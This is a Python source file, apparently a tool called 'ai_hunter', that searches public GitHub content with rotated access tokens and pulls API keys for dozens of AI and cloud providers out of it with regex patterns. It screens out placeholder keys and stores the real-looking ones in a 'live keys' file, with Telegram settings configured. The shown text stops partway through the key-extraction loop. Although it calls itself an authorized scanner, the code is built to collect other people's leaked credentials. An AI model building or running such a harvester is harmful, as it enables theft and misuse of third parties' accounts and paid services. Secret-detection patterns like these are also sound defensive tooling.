#!/usr/bin/env python3

import os, re, json, math, time, base64, logging, hashlib, threading, urllib.request, urllib.parse, urllib.error
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from flask import Flask, jsonify


app = Flask(__name__)

@app.get("/")
def home():
    return jsonify({
        "status": "online",
        "service": "authorized-secret-scanner"
    })

@app.get("/health")
def health():
    return jsonify({"status": "healthy"})

C = {
    "red":"\033[91m","green":"\033[92m","yellow":"\033[93m",
    "blue":"\033[94m","cyan":"\033[96m","white":"\033[97m",
    "magenta":"\033[95m","bold":"\033[1m","dim":"\033[2m","reset":"\033[0m",
}
def col(t,*cs): return "".join(C[c] for c in cs)+str(t)+C["reset"]

def _load_dotenv(path=".env"):
    if not os.path.isfile(path): return
    with open(path) as f:
        for line in f:
            line=line.strip()
            if not line or line.startswith("#") or "=" not in line: continue
            k,_,v=line.partition("=")
            v=v.strip().strip('"').strip("'")
            os.environ.setdefault(k.strip(),v)
_load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN","")
TELEGRAM_CHAT_ID   = os.getenv("TELEGRAM_CHAT_ID","")
CYCLE_SLEEP        = int(os.getenv("CYCLE_SLEEP","180"))
ENTROPY_THRESHOLD  = float(os.getenv("ENTROPY_THRESHOLD","3.2"))
MAX_CONTENT_BYTES  = int(os.getenv("MAX_CONTENT_BYTES","500000"))
SEARCH_PAGES       = int(os.getenv("SEARCH_PAGES","3"))
GIST_PAGES         = int(os.getenv("GIST_PAGES","3"))
PUSH_PAGES         = int(os.getenv("PUSH_PAGES","3"))
MAX_WORKERS        = int(os.getenv("MAX_WORKERS","0"))

GITHUB_TOKENS = []
for _i in range(1,10):
    _t=os.getenv(f"GITHUB_TOKEN_{_i}","")
    if _t.strip(): GITHUB_TOKENS.append(_t.strip())
if not GITHUB_TOKENS and os.getenv("GITHUB_TOKEN"):
    GITHUB_TOKENS.append(os.getenv("GITHUB_TOKEN",""))

def _workers():
    if MAX_WORKERS > 0: return MAX_WORKERS
    return max(8, len(GITHUB_TOKENS)*6)

LOG_FILE="ai_hunter.log"

class _ColorFormatter(logging.Formatter):
    LEVEL_COLORS={
        "DEBUG":   ("dim",),
        "INFO":    ("white",),
        "WARNING": ("yellow","bold"),
        "ERROR":   ("red","bold"),
        "CRITICAL":("red","bold"),
    }
    def format(self,record):
        cs=self.LEVEL_COLORS.get(record.levelname,("white",))
        ts=datetime.now().strftime("%H:%M:%S")
        prefix=col(f"[{ts}]","dim")
        lvl=col(f"[{record.levelname[:4]}]",*cs)
        return f"{prefix} {lvl} {record.getMessage()}"

class _PlainFormatter(logging.Formatter):
    def format(self,record):
        return f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} [{record.levelname}] {record.getMessage()}"

log=logging.getLogger("ai_hunter")
log.setLevel(logging.DEBUG)
_fh=logging.FileHandler(LOG_FILE,encoding="utf-8")
_fh.setFormatter(_PlainFormatter())
_fh.setLevel(logging.DEBUG)
_sh=logging.StreamHandler()
_sh.setFormatter(_ColorFormatter())
_sh.setLevel(logging.DEBUG)
log.addHandler(_fh)
log.addHandler(_sh)

LIVE_KEYS_FILE    ="ai_live_keys.txt"
REPORT_FILE       ="ai_hunter_report.txt"
RESULTS_JSON_FILE ="ai_hunter_results.json"
SEEN_KEYS_FILE    ="ai_seen_keys.txt"
_results_lock     =threading.Lock()
_results          =[]

def _flush_results():
    with _results_lock:
        with open(RESULTS_JSON_FILE,"w",encoding="utf-8") as f:
            json.dump(_results,f,indent=2)

def _append_file(path,text):
    with _results_lock:
        with open(path,"a",encoding="utf-8") as f:
            f.write(text+"\n")

class TokenRotator:
    def __init__(self,tokens):
        self._tokens  = tokens if tokens else [""]
        self._idx     = 0
        self._lock    = threading.Lock()
        self._backoff = {}

    def get(self):
        with self._lock:
            for _ in range(len(self._tokens)*2):
                tok=self._tokens[self._idx % len(self._tokens)]
                self._idx+=1
                if time.monotonic()>=self._backoff.get(tok,0):
                    return tok
            earliest=min(self._backoff.get(t,0) for t in self._tokens)
            wait_s=max(0,earliest-time.monotonic())+2
            log.warning(col(f"All tokens rate-limited. Sleeping {wait_s:.0f}s ...","yellow"))
            time.sleep(wait_s)
            self._backoff.clear()
            return self._tokens[0]

    def backoff(self,token,seconds=65.0):
        with self._lock:
            self._backoff[token]=time.monotonic()+seconds
            log.warning(col(f"Token ...{token[-6:]} rate-limited; backoff {seconds:.0f}s","yellow"))

_rotator=TokenRotator(GITHUB_TOKENS)
_UA="Mozilla/5.0 (X11; Linux x86_64) ai-hunter/2.0"

def _request(method,url,*,headers=None,body=None,timeout=20,retries=3):
    h={"User-Agent":_UA}
    if headers: h.update(headers)
    for attempt in range(1,retries+1):
        try:
            req=urllib.request.Request(url,data=body,headers=h,method=method)
            with urllib.request.urlopen(req,timeout=timeout) as r:
                return r.status,dict(r.headers),r.read()
        except urllib.error.HTTPError as e:
            return e.code,dict(e.headers),e.read()
        except Exception:
            if attempt==retries: raise
            time.sleep(2**attempt)
    return 0,{},b""

def _github_get(path,params=None,token=None):
    tok=token or _rotator.get()
    url="https://api.github.com"+path
    if params: url+="?"+urllib.parse.urlencode(params)
    h={"Accept":"application/vnd.github+json","X-GitHub-Api-Version":"2022-11-28"}
    if tok: h["Authorization"]=f"Bearer {tok}"
    status,rh,raw=_request("GET",url,headers=h)
    remaining=int(rh.get("X-RateLimit-Remaining","1") or "1")
    reset_at =int(rh.get("X-RateLimit-Reset","0") or "0")
    if status in(403,429) or remaining==0:
        wait_s=max(0,reset_at-time.time())+5
        _rotator.backoff(tok,wait_s)
        return status,rh,None
    try: return status,rh,json.loads(raw)
    except: return status,rh,None

def _fetch_raw(url,token=None):
    tok=token or _rotator.get()
    h={"User-Agent":_UA}
    if tok: h["Authorization"]=f"Bearer {tok}"
    try:
        status,_,raw=_request("GET",url,headers=h,timeout=22)
        if status==200:
            content=raw[:MAX_CONTENT_BYTES].decode("utf-8",errors="replace")
            if content.strip(): return content
            log.debug(col(f"    [EMPTY] blank content: {url[:80]}","dim"))
            return ""
        log.debug(col(f"    [HTTP {status}] fetch failed: {url[:80]}","dim"))
        return ""
    except Exception as exc:
        log.debug(col(f"    [ERR] {exc} — {url[:80]}","dim"))
        return ""

def _entropy(s):
    if not s: return 0.0
    freq=defaultdict(int)
    for c in s: freq[c]+=1
    n=len(s)
    return -sum((v/n)*math.log2(v/n) for v in freq.values())

def _is_likely_real(key):
    return _entropy(key)>=ENTROPY_THRESHOLD

_SKIP_FNAME=re.compile(
    r"(\.env\.example|\.env\.sample|\.env\.template|\.env\.test|"
    r"example\.|sample\.|template\.|_spec\.|__tests?__|fixture|"
    r"\.md$|README|CHANGELOG|mock|stub|fake|dummy)",
    re.IGNORECASE,
)
_SKIP_FRAGS=(
    "test","example","your_","xxxx","insert","placeholder","changeme",
    "<",">","process.env","os.environ","os.getenv","config.get","env.get",
    "getenv","environ[","your-api-key","your_api_key","xxxxxxxx","000000",
    "aaaaaa","replace_","<your","insert_","none","null","undefined",
    "sk-xxxx","sk-test","dummy","fake","sample","demo",
)

def _skip_fname(n): return bool(_SKIP_FNAME.search(n))

def _skip_key(k):
    kl=k.lower()
    for f in _SKIP_FRAGS:
        if f in kl: return True
    return not _is_likely_real(k)

# ── PATTERNS ────────────────────────────────────────────────────────────────
# Original 13 platforms
_PAT_OPENAI_PROJ   = re.compile(r'\bsk-proj-[A-Za-z0-9_\-]{80,200}\b')
_PAT_OPENAI_SVCACC = re.compile(r'\bsk-svcacct-[A-Za-z0-9_\-]{80,200}\b')
_PAT_OPENAI_LEGACY = re.compile(r'\bsk-[A-Za-z0-9]{48}\b')
_PAT_ANTHROPIC     = re.compile(r'\bsk-ant-(?:api\d+-)?[A-Za-z0-9_\-]{80,200}\b')
_PAT_GROQ          = re.compile(r'\bgsk_[A-Za-z0-9]{52}\b')
_PAT_XAI           = re.compile(r'\bxai-[A-Za-z0-9]{80,200}\b')
_PAT_PERPLEXITY    = re.compile(r'\bpplx-[A-Za-z0-9]{48,64}\b')
_PAT_GEMINI        = re.compile(r'\bAIza[A-Za-z0-9_\-]{35}\b')
_PAT_HUGGINGFACE   = re.compile(r'\bhf_[A-Za-z0-9]{34}\b')
_PAT_REPLICATE     = re.compile(r'\br8_[A-Za-z0-9]{40}\b')
_PAT_DEEPSEEK_ENV  = re.compile(r'(?i)DEEPSEEK_API_KEY\s*[=:]\s*["\']?(sk-[a-f0-9]{32})["\']?')
_PAT_MISTRAL_ENV   = re.compile(r'(?i)MISTRAL_API_KEY\s*[=:]\s*["\']?([A-Za-z0-9]{32})["\']?')
_PAT_COHERE_ENV    = re.compile(r'(?i)COHERE_API_KEY\s*[=:]\s*["\']?([A-Za-z0-9]{40})["\']?')
_PAT_TOGETHER_ENV  = re.compile(r'(?i)TOGETHER(?:_AI)?_API_KEY\s*[=:]\s*["\']?([a-f0-9]{64})["\']?')
_PAT_ELEVENLABS_ENV= re.compile(r'(?i)ELEVEN(?:LABS)?_API_KEY\s*[=:]\s*["\']?([a-f0-9]{32})["\']?')

# ── Batch 1: Cerebras, OpenRouter, Fireworks, Novita, AI21, Azure OpenAI ────
_PAT_CEREBRAS_ENV    = re.compile(r'(?i)CEREBRAS_API_KEY\s*[=:]\s*["\']?(csk-[A-Za-z0-9]{48,96})["\']?')
_PAT_CEREBRAS_BARE   = re.compile(r'\bcsk-[A-Za-z0-9]{48,96}\b')
_PAT_OPENROUTER_ENV  = re.compile(r'(?i)OPENROUTER_API_KEY\s*[=:]\s*["\']?(sk-or-v1-[A-Za-z0-9]{64,120})["\']?')
_PAT_OPENROUTER_BARE = re.compile(r'\bsk-or-v1-[A-Za-z0-9]{64,120}\b')
_PAT_FIREWORKS_ENV   = re.compile(r'(?i)FIREWORKS_API_KEY\s*[=:]\s*["\']?(fw_[A-Za-z0-9]{40,80})["\']?')
_PAT_FIREWORKS_BARE  = re.compile(r'\bfw_[A-Za-z0-9]{40,80}\b')
_PAT_NOVITA_ENV      = re.compile(r'(?i)NOVITA_API_KEY\s*[=:]\s*["\']?([a-f0-9\-]{36,72})["\']?')
_PAT_AI21_ENV        = re.compile(r'(?i)AI21_API_KEY\s*[=:]\s*["\']?([A-Za-z0-9]{32,64})["\']?')
_PAT_AZURE_OPENAI    = re.compile(r'(?i)AZURE_OPENAI_API_KEY\s*[=:]\s*["\']?([A-Za-z0-9]{32,64})["\']?')

# ── Batch 2: Fal AI, Stability AI, AWS Bedrock, Cloudflare, NVIDIA, Voyage ──
_PAT_FAL_ENV         = re.compile(r'(?i)FAL_KEY\s*[=:]\s*["\']?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}:[A-Za-z0-9_\-]{20,60})["\']?')
_PAT_FAL_ENV2        = re.compile(r'(?i)FAL_API_KEY\s*[=:]\s*["\']?([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}:[A-Za-z0-9_\-]{20,60})["\']?')
_PAT_STABILITY_ENV   = re.compile(r'(?i)STABILITY(?:AI)?_API_KEY\s*[=:]\s*["\']?(sk-[A-Za-z0-9]{48,64})["\']?')
_PAT_BEDROCK_LONG    = re.compile(r'\bABSK[A-Za-z0-9+/]{128,140}\b')
_PAT_BEDROCK_SHORT   = re.compile(r'\bbedrock-api-key-[A-Za-z0-9+/=]{100,}\b')
_PAT_CLOUDFLARE_ENV  = re.compile(r'(?i)CLOUDFLARE_API_TOKEN\s*[=:]\s*["\']?([A-Za-z0-9_\-]{40})["\']?')
_PAT_CF_WORKERS_ENV  = re.compile(r'(?i)CF_API_TOKEN\s*[=:]\s*["\']?([A-Za-z0-9_\-]{40})["\']?')
_PAT_NVIDIA_ENV      = re.compile(r'(?i)NVIDIA_API_KEY\s*[=:]\s*["\']?(nvapi-[A-Za-z0-9_\-]{36,80})["\']?')
_PAT_NVIDIA_BARE     = re.compile(r'\bnvapi-[A-Za-z0-9_\-]{36,80}\b')
_PAT_VOYAGE_ENV      = re.compile(r'(?i)VOYAGE_API_KEY\s*[=:]\s*["\']?(pa-[A-Za-z0-9_\-]{40,80})["\']?')
_PAT_VOYAGE_BARE     = re.compile(r'\bpa-[A-Za-z0-9_\-]{40,80}\b')

# ── Batch 3: MiniMax, Moonshot(Kimi), Qwen(DashScope), Runway, Kling ────────
_PAT_MINIMAX_ENV     = re.compile(r'(?i)MINIMAX_API_KEY\s*[=:]\s*["\'\']?([A-Za-z0-9_\-]{48,80})["\'\']?')
_PAT_MOONSHOT_ENV    = re.compile(r'(?i)MOONSHOT_API_KEY\s*[=:]\s*["\'\']?(sk-[A-Za-z0-9]{40,80})["\'\']?')
_PAT_MOONSHOT_BARE   = re.compile(r'\bsk-[A-Za-z0-9]{40,80}\b')
_PAT_QWEN_ENV        = re.compile(r'(?i)(?:DASHSCOPE|QWEN|TONGYI)_API_KEY\s*[=:]\s*["\'\']?([a-f0-9]{32})["\'\']?')
_PAT_RUNWAY_ENV      = re.compile(r'(?i)RUNWAYML_API_SECRET\s*[=:]\s*["\'\']?(key_[a-f0-9]{128})["\'\']?')
_PAT_RUNWAY_BARE     = re.compile(r'\bkey_[a-f0-9]{128}\b')
_PAT_KLING_ENV       = re.compile(r'(?i)KLING(?:_AI)?_API_(?:KEY|SECRET)\s*[=:]\s*["\'\']?([A-Za-z0-9_\-]{32,80})["\'\']?')

# ── Batch 4: Leonardo AI, Luma AI, Ideogram, Pika Labs, Suno, DeepAI ────────
_PAT_LEONARDO_ENV    = re.compile(r'(?i)LEONARDO(?:_AI)?_API_KEY\s*[=:]\s*["\'\']?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})["\'\']?')
_PAT_LEONARDO_BARE   = re.compile(r'(?i)authorization:\s*Bearer\s+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})\b')
_PAT_LUMA_ENV        = re.compile(r'(?i)LUMAAI_API_KEY\s*[=:]\s*["\'\']?([A-Za-z0-9_\-]{60,120})["\'\']?')
_PAT_LUMA_ENV2       = re.compile(r'(?i)LUMA(?:_AI)?_API_KEY\s*[=:]\s*["\'\']?([A-Za-z0-9_\-]{60,120})["\'\']?')
_PAT_IDEOGRAM_ENV    = re.compile(r'(?i)IDEOGRAM_API_KEY\s*[=:]\s*["\'\']?([A-Za-z0-9_\-]{30,80})["\'\']?')
_PAT_PIKA_ENV        = re.compile(r'(?i)PIKA(?:_LABS)?_API_KEY\s*[=:]\s*["\'\']?([A-Za-z0-9_\-]{30,80})["\'\']?')
_PAT_DEEPAI_ENV      = re.compile(r'(?i)DEEPAI_API_KEY\s*[=:]\s*["\'\']?([a-f0-9\-]{36,72})["\'\']?')

# ── Batch 5: Coze, Zhipu/GLM, BFL/Flux, Jina AI, Deepgram, AssemblyAI ───────
_PAT_COZE_ENV        = re.compile(r'(?i)COZE_API_TOKEN\s*[=:]\s*["\']?(pat_[A-Za-z0-9_\-]{40,100})["\']?')
_PAT_COZE_BARE       = re.compile(r'\bpat_[A-Za-z0-9_\-]{40,100}\b')
_PAT_ZHIPU_ENV       = re.compile(r'(?i)(?:ZHIPU|GLM|BIGMODEL|ZAI)_API_KEY\s*[=:]\s*["\']?([A-Za-z0-9_\-]{32,64})["\']?')
_PAT_BFL_ENV         = re.compile(r'(?i)(?:BFL|FLUX|BLACK_FOREST)_API_KEY\s*[=:]\s*["\']?([a-f0-9\-]{36,80})["\']?')
_PAT_JINA_ENV        = re.compile(r'(?i)JINA_API_KEY\s*[=:]\s*["\']?(jina_[A-Za-z0-9_\-]{50,120})["\']?')
_PAT_JINA_BARE       = re.compile(r'\bjina_[A-Za-z0-9_\-]{50,120}\b')
_PAT_DEEPGRAM_ENV    = re.compile(r'(?i)DEEPGRAM_API_KEY\s*[=:]\s*["\']?([a-f0-9]{40})["\']?')
_PAT_ASSEMBLYAI_ENV  = re.compile(r'(?i)ASSEMBLYAI_API_KEY\s*[=:]\s*["\']?([a-f0-9]{32,40})["\']?')

# ── Batch 6: SambaNova, Hyperbolic, Lepton AI, Cartesia, Pinecone, GetImg ────
_PAT_SAMBANOVA_ENV   = re.compile(r'(?i)SAMBANOVA_API_KEY\s*[=:]\s*["\']?([a-f0-9\-]{36,72})["\']?')
_PAT_HYPERBOLIC_ENV  = re.compile(r'(?i)HYPERBOLIC_API_KEY\s*[=:]\s*["\']?([A-Za-z0-9_\-]{40,80})["\']?')
_PAT_LEPTON_ENV      = re.compile(r'(?i)LEPTON_API_TOKEN\s*[=:]\s*["\']?([a-f0-9]{32})["\']?')
_PAT_CARTESIA_ENV    = re.compile(r'(?i)CARTESIA_API_KEY\s*[=:]\s*["\']?(sk_car_[A-Za-z0-9_\-]{40,80})["\']?')
_PAT_CARTESIA_BARE   = re.compile(r'\bsk_car_[A-Za-z0-9_\-]{40,80}\b')
_PAT_PINECONE_ENV    = re.compile(r'(?i)PINECONE_API_KEY\s*[=:]\s*["\']?([a-f0-9\-]{36,72})["\']?')
_PAT_PINECONE_BARE   = re.compile(r'\bpcsk_[A-Za-z0-9]{40,80}\b')
_PAT_GETIMG_ENV      = re.compile(r'(?i)GETIMG_API_KEY\s*[=:]\s*["\']?(key-[A-Za-z0-9]{32,64})["\']?')
_PAT_GETIMG_BARE     = re.compile(r'\bkey-[A-Za-z0-9]{32,64}\b')
_PAT_DEEPAI_BARE     = re.compile(r'\bquickstart-[A-Za-z0-9]{20,40}\b')


def _extract(content,filename=""):
    if _skip_fname(filename): return []
    found=[]

    # ── Original 13 platforms ────────────────────────────────────────────────
    for m in _PAT_OPENAI_PROJ.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"openai","key_type":"sk-proj","key":k,"filename":filename})
        else:
            log.debug(col(f"    [FILT-OPENAI-PROJ] {k[:50]}","dim"))

    for m in _PAT_OPENAI_SVCACC.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"openai","key_type":"sk-svcacct","key":k,"filename":filename})

    for m in _PAT_OPENAI_LEGACY.finditer(content):
        k=m.group(0)
        if k.startswith("sk-proj-") or k.startswith("sk-svcacct-") or k.startswith("sk-ant-"): continue
        if not _skip_key(k):
            found.append({"platform":"openai","key_type":"sk-legacy","key":k,"filename":filename})
        else:
            log.debug(col(f"    [FILT-OPENAI-LEG] {k[:50]}","dim"))

    for m in _PAT_ANTHROPIC.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"anthropic","key_type":"sk-ant","key":k,"filename":filename})
        else:
            log.debug(col(f"    [FILT-ANTHROPIC] {k[:50]}","dim"))

    for m in _PAT_GROQ.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"groq","key_type":"gsk","key":k,"filename":filename})

    for m in _PAT_XAI.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"xai","key_type":"xai","key":k,"filename":filename})

    for m in _PAT_PERPLEXITY.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"perplexity","key_type":"pplx","key":k,"filename":filename})

    for m in _PAT_GEMINI.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"gemini","key_type":"AIza","key":k,"filename":filename})

    for m in _PAT_HUGGINGFACE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"huggingface","key_type":"hf","key":k,"filename":filename})

    for m in _PAT_REPLICATE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"replicate","key_type":"r8","key":k,"filename":filename})

    for m in _PAT_DEEPSEEK_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"deepseek","key_type":"sk-deepseek","key":k,"filename":filename})

    for m in _PAT_MISTRAL_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"mistral","key_type":"mistral","key":k,"filename":filename})

    for m in _PAT_COHERE_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"cohere","key_type":"cohere","key":k,"filename":filename})

    for m in _PAT_TOGETHER_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"together","key_type":"together","key":k,"filename":filename})

    for m in _PAT_ELEVENLABS_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"elevenlabs","key_type":"elevenlabs","key":k,"filename":filename})

    # ── Batch 1: Cerebras, OpenRouter, Fireworks, Novita, AI21, Azure ────────
    for m in _PAT_CEREBRAS_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"cerebras","key_type":"csk","key":k,"filename":filename})

    for m in _PAT_CEREBRAS_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"cerebras","key_type":"csk","key":k,"filename":filename})

    for m in _PAT_OPENROUTER_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"openrouter","key_type":"sk-or-v1","key":k,"filename":filename})

    for m in _PAT_OPENROUTER_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"openrouter","key_type":"sk-or-v1","key":k,"filename":filename})

    for m in _PAT_FIREWORKS_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"fireworks","key_type":"fw","key":k,"filename":filename})

    for m in _PAT_FIREWORKS_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"fireworks","key_type":"fw","key":k,"filename":filename})

    for m in _PAT_NOVITA_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"novita","key_type":"novita","key":k,"filename":filename})

    for m in _PAT_AI21_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"ai21","key_type":"ai21","key":k,"filename":filename})

    for m in _PAT_AZURE_OPENAI.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"azure_openai","key_type":"azure","key":k,"filename":filename})

    # ── Batch 2: Fal, Stability, Bedrock, Cloudflare, NVIDIA, Voyage ─────────
    for m in _PAT_FAL_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"fal","key_type":"fal_key","key":k,"filename":filename})

    for m in _PAT_FAL_ENV2.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"fal","key_type":"fal_key","key":k,"filename":filename})

    for m in _PAT_STABILITY_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k) and "STABILITY" in content.upper():
            found.append({"platform":"stability","key_type":"sk-stability","key":k,"filename":filename})

    for m in _PAT_BEDROCK_LONG.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"bedrock","key_type":"ABSK","key":k,"filename":filename})

    for m in _PAT_BEDROCK_SHORT.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"bedrock","key_type":"bedrock-short","key":k,"filename":filename})

    for m in _PAT_CLOUDFLARE_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"cloudflare","key_type":"cf_token","key":k,"filename":filename})

    for m in _PAT_CF_WORKERS_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"cloudflare","key_type":"cf_token","key":k,"filename":filename})

    for m in _PAT_NVIDIA_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"nvidia","key_type":"nvapi","key":k,"filename":filename})

    for m in _PAT_NVIDIA_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"nvidia","key_type":"nvapi","key":k,"filename":filename})

    for m in _PAT_VOYAGE_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"voyage","key_type":"pa","key":k,"filename":filename})

    for m in _PAT_VOYAGE_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"voyage","key_type":"pa","key":k,"filename":filename})


    # ── Batch 3: MiniMax, Moonshot, Qwen, Runway, Kling ─────────────────────
    for m in _PAT_MINIMAX_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"minimax","key_type":"minimax","key":k,"filename":filename})

    for m in _PAT_MOONSHOT_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"moonshot","key_type":"sk-moonshot","key":k,"filename":filename})

    for m in _PAT_MOONSHOT_BARE.finditer(content):
        k=m.group(0)
        # Avoid collision with openai/deepseek sk- keys — only capture in moonshot context
        if not _skip_key(k) and any(x in content.lower() for x in ["moonshot","kimi","moonshot_api"]):
            found.append({"platform":"moonshot","key_type":"sk-moonshot","key":k,"filename":filename})

    for m in _PAT_QWEN_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"qwen","key_type":"dashscope","key":k,"filename":filename})

    for m in _PAT_RUNWAY_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"runway","key_type":"key_runway","key":k,"filename":filename})

    for m in _PAT_RUNWAY_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"runway","key_type":"key_runway","key":k,"filename":filename})

    for m in _PAT_KLING_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"kling","key_type":"kling","key":k,"filename":filename})

    # ── Batch 4: Leonardo, Luma, Ideogram, Pika, DeepAI ─────────────────────
    for m in _PAT_LEONARDO_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"leonardo","key_type":"uuid","key":k,"filename":filename})

    for m in _PAT_LUMA_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"luma","key_type":"luma","key":k,"filename":filename})

    for m in _PAT_LUMA_ENV2.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"luma","key_type":"luma","key":k,"filename":filename})

    for m in _PAT_IDEOGRAM_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"ideogram","key_type":"ideogram","key":k,"filename":filename})

    for m in _PAT_PIKA_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"pika","key_type":"pika","key":k,"filename":filename})

    for m in _PAT_DEEPAI_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"deepai","key_type":"quickstart","key":k,"filename":filename})

    for m in _PAT_DEEPAI_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"deepai","key_type":"deepai","key":k,"filename":filename})

    # ── Batch 5: Coze, Zhipu, BFL/Flux, Jina, Deepgram, AssemblyAI ──────────
    for m in _PAT_COZE_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"coze","key_type":"pat","key":k,"filename":filename})

    for m in _PAT_COZE_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"coze","key_type":"pat","key":k,"filename":filename})

    for m in _PAT_ZHIPU_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"zhipu","key_type":"glm","key":k,"filename":filename})

    for m in _PAT_BFL_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"bfl","key_type":"flux","key":k,"filename":filename})

    for m in _PAT_JINA_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"jina","key_type":"jina","key":k,"filename":filename})

    for m in _PAT_JINA_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"jina","key_type":"jina","key":k,"filename":filename})

    for m in _PAT_DEEPGRAM_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"deepgram","key_type":"deepgram","key":k,"filename":filename})

    for m in _PAT_ASSEMBLYAI_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"assemblyai","key_type":"assemblyai","key":k,"filename":filename})

    # ── Batch 6: SambaNova, Hyperbolic, Lepton, Cartesia, Pinecone, GetImg ───
    for m in _PAT_SAMBANOVA_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"sambanova","key_type":"sambanova","key":k,"filename":filename})

    for m in _PAT_HYPERBOLIC_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"hyperbolic","key_type":"hyperbolic","key":k,"filename":filename})

    for m in _PAT_LEPTON_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"lepton","key_type":"lepton","key":k,"filename":filename})

    for m in _PAT_CARTESIA_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"cartesia","key_type":"sk_car","key":k,"filename":filename})

    for m in _PAT_CARTESIA_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"cartesia","key_type":"sk_car","key":k,"filename":filename})

    for m in _PAT_PINECONE_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k):
            found.append({"platform":"pinecone","key_type":"pcsk","key":k,"filename":filename})

    for m in _PAT_PINECONE_ENV.finditer(content):
        k=m.group(1)
        if not _skip_key(k):
            found.append({"platform":"pinecone","key_type":"pinecone","key":k,"filename":filename})

    for m in _PAT_GETIMG_BARE.finditer(content):
        k=m.group(0)
        if not _skip_key(k) and any(x in content.lower() for x in ["getimg","get_img","getimg_api"]):
            found.append({"platform":"getimg","key_type":"key","key":k,"filename":filename})

    for m in _PAT_GETIMG_ENV.finditer(content):
        k=m.group(1)
